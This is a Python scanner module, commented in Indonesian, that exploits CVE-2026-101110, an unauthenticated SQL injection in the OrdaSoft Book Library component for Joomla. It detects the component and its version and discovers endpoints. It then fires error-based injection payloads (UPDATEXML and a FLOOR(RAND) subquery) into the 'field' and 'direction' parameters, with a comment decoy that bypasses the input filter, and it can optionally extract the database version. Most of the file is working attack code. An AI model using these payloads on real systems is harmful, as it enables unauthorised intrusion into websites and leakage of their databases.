# cve_modules/booklibrary.py
"""
CVE-2026-101110 — OrdaSoft Book Library (Free) for Joomla <= 6.4.6
Unauthenticated SQLi in site/booklibrary.php books() — field/direction
→ ORDER BY. Bypass protectInjectionWithoutQuote() via session prime +
trailing `-- xselect`.

Adaptasi dari PoC pocbit.org jadi modul scanning untuk main.py.

Prinsip klasifikasi:
  vulnerable=True  HANYA kalau SQLi terbukti (leak ~...~ keluar).
  Versi rentan tapi SQLi belum terbukti -> vulnerable=False (suspect).
  Versi patched                          -> vulnerable=False (clean).
  Versi unknown                          -> vulnerable=False (suspect).

Mode:
  - check_only=True  (default): coba flag-based SQLi saja.
  - check_only=False            : kalau flag gagal, coba SELECT VERSION()
                                  (aggressive).
"""

from __future__ import annotations

import random
import re
import string
from urllib.parse import urlencode, urljoin, urlparse

import requests
from requests.adapters import HTTPAdapter

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


# ── metadata untuk main.py ──────────────────────────────────────────────

CVE_META = {
    "id": "CVE-2026-101110",
    "name": "OrdaSoft Book Library SQLi (Joomla)",
    "func": "check_cve_2026_101110",
    "kwargs": {"check_only": True},
    "priority": 35,
}


# ── konstanta ───────────────────────────────────────────────────────────

COMPONENT = "com_booklibrary"
FIX_VERSION = (6, 4, 7)
BLACKLIST_DECOY = " -- xselect"
DEFAULT_TIMEOUT = 25

TASKS = ("showCategory", "search", "showBooks", "books", "showRent")
MANIFEST_PATHS = (
    "/administrator/components/com_booklibrary/booklibrary.xml",
    "/administrator/components/com_booklibrary/com_booklibrary.xml",
)
COMPONENT_HINTS = (
    "/components/com_booklibrary/",
    "/media/com_booklibrary/",
    "/images/com_booklibrary/",
)

SQL_ERR_RE = re.compile(
    r"(SQL syntax|mysql_fetch|mysqli_|MySQL server|You have an error in "
    r"your SQL|Duplicate entry|XPATH syntax error|Warning:.*mysql)",
    re.I,
)
TILDE_RE = re.compile(r"~([^~]{1,220})~")
VER_RE = re.compile(r"<version>\s*([^<]+?)\s*</version>", re.I)
CATID_RE = re.compile(
    r"option=com_booklibrary[^\"'<>]*catid=(\d+)", re.I)
ITEMID_RE = re.compile(
    r"option=com_booklibrary[^\"'<>]*Itemid=(\d+)", re.I)

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


# ── helpers ─────────────────────────────────────────────────────────────

def _mk_session(timeout):
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "*/*"})
    adapter = HTTPAdapter(max_retries=0,
                          pool_connections=10, pool_maxsize=10)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.verify = False
    s.request_timeout = timeout
    return s


def _get(s, url):
    try:
        return s.get(url, timeout=s.request_timeout, verify=False,
                     allow_redirects=True)
    except requests.RequestException:
        return None


def _post(s, url, data):
    try:
        return s.post(url, data=data, timeout=s.request_timeout,
                      verify=False, allow_redirects=True)
    except requests.RequestException:
        return None


def _normalize_base(raw):
    raw = (raw or "").strip().rstrip("/")
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    p = urlparse(raw)
    if not p.netloc:
        return None
    scheme = p.scheme if p.scheme in ("http", "https") else "https"
    return f"{scheme}://{p.netloc}"


def _parse_version(text):
    if not text:
        return None
    m = VER_RE.search(text) or re.search(r"\b(\d+\.\d+\.\d+)\b", str(text))
    if not m:
        return None
    parts = []
    for x in m.group(1).split("."):
        try:
            parts.append(int(x))
        except ValueError:
            break
    return tuple(parts) if parts else None


def _version_vulnerable(v):
    if not v:
        return None
    return v < FIX_VERSION


def _detect_component(s, base):
    hints = []
    for path in COMPONENT_HINTS:
        r = _get(s, urljoin(base + "/", path.lstrip("/")))
        if r is not None and r.status_code in (200, 401, 403, 301, 302):
            hints.append(path)
    r = _get(s, base + "/")
    if r is not None and COMPONENT in (r.text or ""):
        hints.append("homepage_ref")
    return bool(hints), hints


def _fetch_version(s, base):
    for path in MANIFEST_PATHS:
        r = _get(s, base + path)
        if r is not None and r.status_code == 200 \
                and "<version>" in (r.text or ""):
            return _parse_version(r.text), path
    return None, None


def _scrape_route_hints(s, base):
    catids, itemids = [], []
    for path in ("/", "/index.php"):
        r = _get(s, base + path)
        if r is None:
            continue
        body = r.text or ""
        catids.extend(CATID_RE.findall(body))
        itemids.extend(ITEMID_RE.findall(body))
    r = _get(s, base + f"/index.php?option={COMPONENT}")
    if r is not None:
        body = r.text or ""
        catids.extend(CATID_RE.findall(body))
        itemids.extend(ITEMID_RE.findall(body))
    catids = list(dict.fromkeys(catids))[:8] or ["1", "2", "0"]
    itemids = list(dict.fromkeys(itemids))[:5]
    return catids, itemids


def _build_route(base, task, catid="1", itemid=None):
    q = {"option": COMPONENT, "task": task}
    if task == "search":
        q["searchtext"] = "a"
        q["catid"] = str(catid)
    else:
        q["catid"] = str(catid)
    if itemid:
        q["Itemid"] = str(itemid)
    return base.rstrip("/") + "/index.php?" + urlencode(q)


def _rand_mark():
    return "".join(random.choice(string.ascii_lowercase) for _ in range(5))


def _field_error_expr(inner_sql):
    inner = inner_sql.strip()
    return (
        "(SELECT 6062 FROM(SELECT COUNT(*),"
        "CONCAT(0x7e,(%s),0x7e,FLOOR(RAND(0)*2))x "
        "FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)" % inner
    )


def _field_updatexml(inner_sql):
    inner = inner_sql.strip()
    return "UPDATEXML(1,CONCAT(0x7e,(%s),0x7e),1)" % inner


def _wrap_decoy(expr):
    return expr.rstrip() + BLACKLIST_DECOY


def _parse_leak(body):
    if not body:
        return None
    m = TILDE_RE.search(body)
    return m.group(1).strip() if m else None


# ── discovery ───────────────────────────────────────────────────────────

def _discover_endpoint(s, base, catids, itemids):
    for task in TASKS:
        for catid in catids:
            for itemid in [None] + itemids:
                route = _build_route(base, task, catid=catid,
                                     itemid=itemid)
                r = _get(s, route)
                if r is None:
                    continue
                if r.status_code in (404, 410):
                    continue
                body = r.text or ""
                if "404 Component not found" in body \
                        or "Invalid controller" in body:
                    continue
                if r.status_code == 200 and len(body) > 200:
                    return {"route": route, "task": task,
                            "catid": catid, "itemid": itemid}
    return None


# ── SQLi vectors ────────────────────────────────────────────────────────

def _prime_session(s, route_url):
    sep = "&" if "?" in route_url else "?"
    url = route_url + sep + urlencode({"field": "title", "direction": "ASC"})
    r = _get(s, url)
    return r is not None


def _inject_urls(route_url, field_val, direction_val):
    sep = "&" if "?" in route_url else "?"
    q = urlencode({"field": field_val, "direction": direction_val})
    return route_url + sep + q


def _try_vectors(s, route_url, subquery):
    _prime_session(s, route_url)
    flag = _rand_mark()
    attempts = []

    sub_flag = "SELECT CONCAT('%s')" % flag
    sub_ver = subquery.strip()

    field_payloads = [
        ("field_updatexml", _wrap_decoy(_field_updatexml(sub_ver))),
        ("field_error_subquery", _wrap_decoy(_field_error_expr(sub_ver))),
        ("field_error_flag", _wrap_decoy(_field_error_expr(sub_flag))),
    ]
    for name, fval in field_payloads:
        attempts.append((name + "_get",
                         _inject_urls(route_url, fval, "ASC"), None))
        attempts.append((name + "_post", None,
                         {"field": fval, "direction": "ASC"}))

    dir_inj = _wrap_decoy(_field_error_expr(sub_ver))
    attempts.append(("direction_comma_get",
                     _inject_urls(route_url, "title", "ASC," + dir_inj),
                     None))
    attempts.append(("direction_comma_post", None,
                     {"field": "title", "direction": "ASC," + dir_inj}))

    for name, url, data in attempts:
        if url:
            r = _get(s, url)
        else:
            r = _post(s, route_url, data)
        if r is None:
            continue
        body = r.text or ""
        leak = _parse_leak(body)
        if leak:
            if "flag" in name and flag not in leak:
                continue
            return leak, name
        if SQL_ERR_RE.search(body) and "error" in name:
            return None, name + "_sql_error"

    return None, None


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_101110(target_url: str,
                          timeout: int = DEFAULT_TIMEOUT,
                          check_only: bool = True,
                          aggressive: bool = False) -> dict:
    """
    Cek target terhadap CVE-2026-101110.

    Args:
        target_url : URL target (boleh tanpa scheme)
        timeout    : timeout HTTP (default 25s)
        check_only : True  -> coba flag-based SQLi saja
                     False -> sama, tapi aggressive fallback ke VERSION()
        aggressive : kalau True, langsung coba SELECT VERSION() juga

    Return:
        {
            "vulnerable": bool,   # True HANYA kalau SQLi terbukti (leak)
            "evidence":   str | None,
            "reason":     str,
            "version":    str | None,
            "component":  bool,
            "endpoint":   str | None,
            "vector":     str | None,
        }
    """
    base = _normalize_base(target_url)
    if not base:
        return {"vulnerable": False, "evidence": None,
                "reason": "invalid_url", "version": None,
                "component": False, "endpoint": None, "vector": None}

    s = _mk_session(timeout)

    # ── tahap 1: deteksi komponen ────────────────────────────────────
    comp, hints = _detect_component(s, base)
    if not comp:
        return {"vulnerable": False, "evidence": None,
                "reason": "component_not_found", "version": None,
                "component": False, "endpoint": None, "vector": None}

    # ── tahap 2: fetch versi ────────────────────────────────────────
    ver_tuple, _ = _fetch_version(s, base)
    ver_str = ".".join(str(x) for x in ver_tuple) if ver_tuple else None
    vuln_ver = _version_vulnerable(ver_tuple) if ver_tuple else None

    # versi terkonfirmasi patched -> clean, nggak lanjut
    if vuln_ver is False:
        return {"vulnerable": False, "evidence": None,
                "reason": f"version_{ver_str}_patched",
                "version": ver_str, "component": True,
                "endpoint": None, "vector": None}

    # ── tahap 3: discover endpoint ──────────────────────────────────
    catids, itemids = _scrape_route_hints(s, base)
    ep = _discover_endpoint(s, base, catids, itemids)
    if not ep:
        reason = ("vulnerable_version_suspect" if vuln_ver is True
                  else "component_no_route_suspect")
        return {"vulnerable": False, "evidence": None,
                "reason": reason, "version": ver_str,
                "component": True, "endpoint": None, "vector": None}

    # ── tahap 4: coba SQLi ──────────────────────────────────────────
    flag = _rand_mark()
    leak, vec = _try_vectors(s, ep["route"],
                             f"SELECT CONCAT('{flag}')")
    if leak and flag in (leak or ""):
        return {"vulnerable": True,
                "evidence": f"SQLi confirmed via {vec}, leak: {leak[:120]}",
                "reason": "sqli_confirmed_flag",
                "version": ver_str, "component": True,
                "endpoint": ep["route"], "vector": vec}

    if aggressive or not check_only:
        leak2, vec2 = _try_vectors(s, ep["route"], "SELECT VERSION()")
        if leak2:
            return {"vulnerable": True,
                    "evidence": f"SQLi confirmed via {vec2}, "
                                f"leak: {leak2[:120]}",
                    "reason": "sqli_confirmed_version",
                    "version": ver_str, "component": True,
                    "endpoint": ep["route"], "vector": vec2}

    # ── nggak terbukti SQLi ─────────────────────────────────────────
    if vuln_ver is True:
        return {"vulnerable": False,
                "evidence": None,
                "reason": "vulnerable_version_suspect_sqli_unconfirmed",
                "version": ver_str, "component": True,
                "endpoint": ep["route"], "vector": None}

    return {"vulnerable": False, "evidence": None,
            "reason": "component_present_sqli_unconfirmed",
            "version": ver_str, "component": True,
            "endpoint": ep["route"], "vector": None}